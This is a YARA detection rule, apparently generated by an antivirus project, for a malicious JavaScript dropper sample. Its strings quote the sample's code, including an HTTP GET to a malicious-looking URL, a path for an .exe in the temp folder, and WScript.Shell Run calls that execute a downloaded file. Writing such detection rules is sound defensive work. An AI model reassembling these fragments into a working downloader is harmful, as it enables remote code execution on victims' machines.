rule sig_20160329_64d91752f618f67a1b044e2bba48c80c {
  meta:
    description = "datamaliciousorder - file 20160329_64d91752f618f67a1b044e2bba48c80c.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "e7418ec6ea627e47e554df57c4a40c69ac471889c3804fe4ad9b6af9e9857c24"

  strings:
    $s1  = "j[ec](\"GET\", \"http://hiddenhandbags.com/kdk4a\", false);" fullword ascii
    $s2  = "function Tb() {return E0[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"bIz5rWrQgmSU.exe\";};" fullword ascii
    $s3  = "for (;;){WScript[P](H() * 11); if (j[\"readystate\"] >= 2 * 2) break;};" fullword ascii
    $s4  = "var E0 = function E() {return WScript[Va](\"WScript.Shell\");}(), bS = 11;" fullword ascii
    $s5  = "function kP(rc, LZ){Kl = Kl * 1; return rc - LZ;};" fullword ascii
    $s6  = "function r(){return \"\" + gz;};" fullword ascii
    $s7  = "function U(ty){E0[\"Run\"](ty, Kl, Kl);};" fullword ascii
    $s8  = "function YA() {return ((bG == true) && (bG == c)) ? 1 : Kl;};" fullword ascii
    $s9  = "return kP(ku, G);" fullword ascii
    $s10 = "function w(te) {var oD = (1, 2, 3, 4, 5, te); return oD;};" fullword ascii
    $s11 = "function T(){return Va;};" fullword ascii
    $s12 = "function NQ()" fullword ascii
    $s13 = " while (Z){" fullword ascii
    $s14 = "function H(){return 22;};" fullword ascii
    $s15 = "var wo = new this[\"Date\"]();" fullword ascii
    $s16 = "var c = false;" fullword ascii
    $s17 = "c = true; " fullword ascii
    $s18 = "var gy = false;" fullword ascii
    $s19 = "var bG = false;" fullword ascii
    $s20 = "bG = true; " fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}